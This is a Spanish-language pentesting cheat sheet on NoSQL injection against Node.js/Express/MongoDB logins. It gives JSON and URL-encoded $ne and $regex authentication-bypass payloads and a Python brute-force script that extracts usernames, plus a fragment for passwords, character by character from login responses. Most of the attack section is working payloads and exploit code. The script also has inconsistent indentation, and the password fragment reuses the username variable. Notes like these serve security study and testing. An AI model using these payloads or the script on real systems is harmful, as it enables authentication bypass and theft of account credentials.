# NoSQL

Tags: #NoSQLI #NodeJs #MongoDB 

```bash 
- Express framework: Es un entorno de trabajo para aplicaciones web en Node.js, de código abierto y con licencia MIT. Se utiliza para desarrollar aplicaciones web y APIs.

- Node.js: Es un entorno de ejecución de JavaScript de código abierto y multiplataforma, diseñado para construir aplicaciones del lado del servidor y de red. Node.js permite que JavaScript se ejecute en el servidor, no solo en el navegador.

- MongoDB: Es una base de datos NoSQL que almacena datos en documentos flexibles, mientras que Node.js es un entorno de ejecución JavaScript que permite construir aplicaciones del lado del servidor
```

## Inyecciones Json 

* [NoSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

```json 
// Cambiar la cabecera a 'Content-Type: application/json' para que funcione y enviar la data en el cuerpo de la petición 

{
	"username" : "admin",
	"password" : "admin"
}

Nota:
	1. La petición original se debe de cambiar a Json 
```

```json 
// Inyección para indicar que el usuario y la password no es 'admin' por lo que sería 'True'

{
	"username" : {"$ne": "admin"},
	"password" : {"$ne": "admin"}
}
```

## Inyecciones normales 

* [NoSQLMap Tool](https://github.com/codingo/NoSQLMap)

```
❯ username'||'1'=='1        # Acontecer la inyección tipo 'or 1=1' en SQLi
```

```bash 
❯ username[$ne]=admin&password[$ne]=admin&login=login     # Inyección clásica donde se indica que no es igual a 'admin' tanto en el username ni en la password 

# Incluir regex 
❯ username[$regex]=^a.*&password[$ne]=admin&login=login   # La regex indica que el usuario (^ = inicia) con la letra 'a' y tiene contenido (.*) despues 
```

### Obtener el username y password 

```python 
#!/usr/bin/env python3

from pwn import *
import requests
import re 
import signal
import sys
import time
import string
import pdb

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "https://localhost/"        # Se coloca 'Host + Ruta'
characters = string.ascii_letters + string.digits + string.punctuation


def MakeNoSQLI():

    # Inicio normal del programa
    username = ""   # Si se encuentra un usuario colocar la inicial aqui para buscar mas
    p1 = log.progress("NoSQLi")
    p1.status("Iniciando fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Usuario")
    
	while True:
		for character in characters:
			data_post = {
				'username[$regex]': '^%s%s.*' % (username, character),
				'password[$ne]': 'admin',
				'login': 'login'
			}

			p1.status("%s" % data_post)
			# Evita la redirección del código 302 con 'allow_redirects=False' 
			r = requests.post(main_url, data=data_post, allow_redirects=False) 

			if r.status_code == 302:
				username += character 
				p2.status(username)
				break

if __name__ == '__main__':
    MakeNoSQLI()

 
-----------
# conocer la password para un usuario válido 
	'password[$regex]': "^%s%s.*" % (username, re.escape(character)),
```

